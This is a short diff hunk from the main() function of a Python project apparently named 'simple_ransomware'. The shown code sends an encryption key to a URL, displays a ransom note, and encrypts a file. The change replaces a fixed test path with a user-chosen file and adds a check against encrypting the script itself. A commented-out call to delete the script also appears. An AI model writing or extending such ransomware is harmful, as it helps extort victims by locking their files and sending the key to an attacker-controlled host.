@@ -122,7 +122,14 @@ def main():
     sendKey(key, url)
     ransomNote(url)
     #Encrypt only 1 file for testing purposes.
-    encrypt_file(key, '/workspaces/simple_ransomware/file1.txt')
+    #Ask the user for the file to encrypt.
+    file = input("Enter the file to encrypt: ")
+    #Make sure the file exists and has enough permissions.
+    if os.path.exists(file):
+        if file == "ransomware.py":
+            print("Cannot encrypt self.")
+            return
+        encrypt_file(key, file)
     #Get url to send key to from command line as an argument.
     #If no argument is given, then use ask for the url.
     #deleteScript()
